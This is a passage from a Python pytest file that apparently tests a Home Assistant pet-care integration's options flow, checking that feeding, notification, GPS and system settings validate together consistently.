        """Test consistency between notification and feeding settings."""
        # Configure feeding reminders
        feeding_config = {
            "meals_per_day": 3,
            "feeding_reminders": True,
            "auto_schedule": True,
        }

        await advanced_options_flow.async_step_feeding_settings(feeding_config)

        # Configure notification settings that complement feeding
        notification_config = {
            "quiet_hours": True,
            "quiet_start": "22:00:00",
            "quiet_end": "07:00:00",
            "reminder_repeat_min": 15,  # Frequent reminders for feeding
        }

        result = await advanced_options_flow.async_step_notifications(
            notification_config
        )

        assert result["type"] == FlowResultType.CREATE_ENTRY

    def test_gps_system_settings_consistency(self, advanced_options_flow):
        """Test consistency between GPS and system settings."""
        # GPS settings affect system performance
        gps_intensive_config = {
            "gps_enabled": True,
            "gps_update_interval": 30,  # Frequent updates
            "gps_accuracy_filter": 5,  # High accuracy
        }

        # System settings should accommodate GPS load
        system_config = {
            "performance_mode": "full",  # Need full performance for GPS
            "data_retention_days": 180,  # More retention for GPS data
            "auto_backup": True,  # Important to backup GPS data
        }

        # Both configurations should be compatible
        gps_schema = advanced_options_flow._get_gps_settings_schema()
        system_schema = advanced_options_flow._get_system_settings_schema()

        gps_validated = gps_schema(gps_intensive_config)
        system_validated = system_schema(system_config)

        assert gps_validated is not None
        assert system_validated is not None


if __name__ == "__main__":
    pytest.main([__file__])
